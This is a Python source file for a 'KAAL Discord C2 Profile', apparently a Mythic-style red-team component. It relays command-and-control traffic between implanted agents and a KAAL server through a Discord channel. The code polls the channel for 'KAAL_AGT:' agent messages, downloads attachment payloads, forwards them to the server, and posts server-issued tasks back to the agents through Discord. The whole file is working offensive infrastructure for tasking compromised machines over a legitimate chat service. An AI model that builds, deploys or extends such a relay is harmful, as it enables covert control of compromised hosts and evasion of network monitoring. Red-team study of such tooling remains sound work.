#!/usr/bin/env python3
"""
KAAL Discord C2 Profile – Main Container Service
Runs independently, translates between Discord and KAAL server.
"""

import asyncio
import aiohttp
import yaml
import logging
import time
import signal
import sys
import os
from pathlib import Path
from typing import Optional, Dict, Any

from discord_client import DiscordClient
from translator import MessageTranslator
from rate_limiter import RateLimiter

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("discord_c2")

class DiscordC2Profile:
    """
    Main C2 profile service – exact Mythic pattern.
    """
    
    def __init__(self, config_path: str = "config.yaml"):
        # Explicitly look in the same directory as main.py first
        script_dir = os.path.dirname(__file__)
        local_config = os.path.join(script_dir, "config.yaml")
        
        if os.path.exists(local_config):
            config_path = local_config
        elif not os.path.exists(config_path):
             # Try absolute path based on this file
             config_path = os.path.join(script_dir, config_path)
             
        print(f"DEBUG: Loading config from {config_path}")
        self.config = self._load_config(config_path)
        
        self.discord = None # Initialized in start()
        self.translator = MessageTranslator()
        self.rate_limiter = RateLimiter(self.config['rate_limiting'])
        self.running = True
        self.last_message_id = None
        self.server_session: Optional[aiohttp.ClientSession] = None
        
        # Track pending commands
        self.pending_commands = {}
        
    def _load_config(self, path: str) -> dict:
        """Load configuration from YAML file."""
        try:
            with open(path, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load config from {path}: {e}")
            sys.exit(1)
    
    async def start(self):
        """Main service loop."""
        logger.info("Starting KAAL Discord C2 Profile")
        logger.info(f"Target Channel ID: {self.config['discord']['channel_id']}")
        
        # Async context manager for Discord Client
        async with DiscordClient(self.config['discord']['bot_token']) as self.discord:
            self.server_session = aiohttp.ClientSession()
            
            # Register with KAAL server
            await self._register_with_server()
            
            # Main polling loop
            logger.info("Entering main polling loop...")
            while self.running:
                try:
                    await self._poll_discord()
                    await self._poll_server_tasks() # Check for pending tasks push
                    await self._check_pending_commands()
                    await asyncio.sleep(self.config['discord']['poll_interval'])
                except Exception as e:
                    logger.error(f"Main loop error: {e}")
                    await asyncio.sleep(5)
            
            # Cleanup
            if self.server_session:
                await self.server_session.close()
    
    async def _poll_server_tasks(self):
        """Poll KAAL server for ANY pending tasks to push to agents."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/v1/c2/tasks"
            
            async with self.server_session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    tasks = data.get("tasks", [])
                    for task in tasks:
                        agent_id = task.get("agent_id")
                        if agent_id:
                            logger.info(f"Got pending task for {agent_id} from server poll")
                            await self._queue_command(agent_id, task)
                elif resp.status != 404: # Ignore 404 if endpoint not ready yet
                     pass
        except Exception as e:
            # logger.debug(f"Server task poll error: {e}")
            pass

    async def _register_with_server(self):
        """Register this C2 profile with the KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            url = f"{schema}://{host}:{port}/api/health"
            
            async with self.server_session.get(url) as resp:
                if resp.status == 200:
                    logger.info("Successfully connected to KAAL server")
                else:
                    logger.warning(f"KAAL server connection issue: {resp.status}")
        except Exception as e:
            logger.error(f"Registration/Connection error with KAAL server: {e}")
    
    async def _poll_discord(self):
        """Poll Discord for new messages from agents."""
        channel_id = self.config['discord']['channel_id']
        messages = []
        
        # Use async generator
        async for msg in self.discord.get_channel_messages(channel_id, limit=10, after=self.last_message_id):
            messages.append(msg)
            
        if messages:
            self.last_message_id = messages[-1]['id']
            
        for message in messages:
            content = message.get('content', '')
            author = message.get('author', {})
            
            # Check for attachments (large payloads)
            if message.get('attachments'):
                try:
                    # Prefer first attachment
                    att = message['attachments'][0]
                    url = att.get('url')
                    if url:
                        logger.info(f"Downloading large payload from attachment: {att.get('filename')}")
                        async with self.server_session.get(url) as resp:
                            if resp.status == 200:
                                file_content = await resp.text()
                                # If it's a large payload, it might be just the raw content or prefixed
                                if file_content.startswith('KAAL_AGT:'):
                                    content = file_content
                                else:
                                    # Assume raw content is the payload part? 
                                    # Or maybe the agent sends "KAAL_AGT:" in content AND attachment?
                                    # Let's assume the attachment REPLACES the content if present.
                                    # And we expect it to be the full protocol string.
                                    if len(file_content) > 0:
                                        content = file_content
                except Exception as e:
                    logger.error(f"Failed to download attachment: {e}")

            # Filter messages: process only KAAL_AGT messages
            if not content.startswith('KAAL_AGT:'):
                continue
            
            # Process message
            try:
                agent_id, server_msg = self.translator.discord_to_server(content)
                logger.info(f"Received C2 message from {agent_id} (Size: {len(content)} bytes)")
                await self._forward_to_server(server_msg)
            except Exception as e:
                logger.error(f"Error processing Discord message: {e}")
    
    async def _forward_to_server(self, message: dict):
        """Forward translated message to KAAL server."""
        try:
            schema = "https" if self.config['kaal_server']['use_https'] else "http"
            host = self.config['kaal_server']['host']
            port = self.config['kaal_server']['port']
            path = self.config['kaal_server']['api_path']
            url = f"{schema}://{host}:{port}{path}"
            
            async with self.server_session.post(url, json=message) as resp:
                if resp.status == 200:
                    response = await resp.json()
                    await self._handle_server_response(message['agent_id'], response)
                else:
                    logger.error(f"Server forward failed: {await resp.text()}")
        except Exception as e:
            logger.error(f"Forward error: {e}")
            
    async def _handle_server_response(self, agent_id: str, response: Any):
        """Handle response from server (commands to agent)."""
        if isinstance(response, dict):
            if 'command' in response:
                 await self._queue_command(agent_id, response)
            elif 'tasks' in response and isinstance(response['tasks'], list):
                for task in response['tasks']:
                    await self._queue_command(agent_id, task)

    async def _queue_command(self, agent_id: str, command: dict):
        """Queue a command for delivery to agent."""
        discord_msg = self.translator.server_to_discord(agent_id, command)
        
        logger.info(f"Sending command to agent {agent_id} via Discord...")
        result = await self.discord.send_message(
            self.config['discord']['channel_id'],
            discord_msg
        )
        
        if result:
            logger.info(f"Command delivered. MsgID: {result.get('id')}")
            task_id = command.get('task_id', 'unknown')
            self.pending_commands[task_id] = {
                'agent_id': agent_id,
                'sent_at': time.time(),
                'command': command,
                'discord_id': result.get('id')
            }
        else:
            logger.error("Failed to send command to Discord")
    
    async def _check_pending_commands(self):
        """Check for command timeouts."""
        now = time.time()
        for task_id, cmd_info in list(self.pending_commands.items()):
            if now - cmd_info['sent_at'] > 60:
                del self.pending_commands[task_id]
                
    async def shutdown(self):
        """Graceful shutdown."""
        logger.info("Shutting down Discord C2 profile")
        self.running = False

async def main():
    profile = DiscordC2Profile()
    
    loop = asyncio.get_running_loop()
    try:
        if sys.platform != 'win32':
            for sig in (signal.SIGTERM, signal.SIGINT):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(profile.shutdown()))
    except NotImplementedError:
        pass
    
    try:
        await profile.start()
    except KeyboardInterrupt:
        await profile.shutdown()

if __name__ == "__main__":
    try:
        # Windows selector event loop policy fix (if needed for older python/aiohttp)
        # if sys.platform == 'win32':
        #      asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f"CRITICAL ERROR: {e}")
        sys.exit(1)
